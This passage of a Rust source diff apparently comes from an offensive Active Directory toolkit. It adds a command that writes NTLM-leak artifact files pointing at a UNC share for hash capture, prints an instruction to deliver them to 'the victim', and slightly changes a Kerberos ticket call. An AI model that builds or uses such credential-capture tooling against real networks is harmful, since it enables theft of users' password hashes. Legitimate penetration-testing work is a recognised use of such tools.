+                            ));
+                            return 1;
+                        }
+                        parsed
+                    };
+
+                    banner::print_info(&format!(
+                        "Generating {} artifacts pointing at {} (NTLM hash capture share)",
+                        selected.len(),
+                        unc.cyan()
+                    ));
+
+                    match write_ntlm_leak_files(
+                        output_dir.as_deref().unwrap_or("."),
+                        &unc,
+                        &selected,
+                    ) {
+                        Ok(written) => {
+                            for f in written {
+                                banner::print_success(&format!("wrote {}", f.display()));
+                            }
+                            banner::print_info(
+                                "Deliver to the victim (drop box, archive, shared \
+                                 folder). Captured hashes: ovt ntlm capture will pick them up.",
+                            );
+                            0
+                        }
+                        Err(e) => {
+                            banner::print_fail(&format!("Write failed: {e}"));
+                            1
+                        }
+                    }
                 }
             }
         }
@@ -7845,7 +8484,7 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
             .await;
         }
         KerberosAction::Describe { ref file } => {
-            return commands_impl::cmd_describe_ticket(cli, file).await;
+            return commands_impl::cmd_describe_ticket(cli, file, None).await;
         }
         KerberosAction::UserEnum { .. } => {
             // Handled above before credential check (zero-knowledge, no creds needed)
